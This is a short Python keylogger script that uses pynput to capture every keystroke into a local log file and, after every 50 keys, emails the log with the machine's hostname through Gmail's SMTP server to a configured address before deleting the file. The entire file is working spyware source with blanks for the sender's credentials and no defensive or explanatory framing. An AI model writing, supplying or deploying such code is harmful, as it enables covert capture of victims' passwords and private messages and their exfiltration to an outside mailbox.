import smtplib
import socket
import os
from datetime import datetime
from email.message import EmailMessage
from pynput.keyboard import Key, Listener

EMAIL_ADDRESS = '' #enter sending.destination adress
EMAIL_PASS = '' #enter the password for the email

host = socket.gethostname()
now = datetime.now()
time = now.strftime("%H:%M:%S")

msg = EmailMessage()
msg['Subject'] = f'{host} keylog'
msg['From'] = EMAIL_ADDRESS
msg['To'] = EMAIL_ADDRESS
msg.set_content(f'{time}')
# establish connection

count = 0
filecount = 0
keys = []


def write_file(key):
    with open("log.txt", "a") as f:
        for key in key:

            k = str(key).replace("'", "")

            if k.find(".space") > 0:
                f.write('\n')

            if k.find("Key.") == -1:
                f.write(k)



def send_log():
    global msg
    with open('log.txt', 'rb') as f:
        file_data = f.read()
        file_name = f.name

        msg.add_attachment(file_data, maintype='application', subtype='octet-stream', filename=file_name)

        # send email

    with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp:
        smtp.login(EMAIL_ADDRESS, EMAIL_PASS)
        smtp.send_message(msg)


def on_press(key):
    global keys, count, filecount
    keys.append(key)
    count += 1
    filecount += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

    if filecount >= 50:
        send_log()
        if os.path.exists("log.txt"):
            os.remove("log.txt")
        filecount = 0


def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
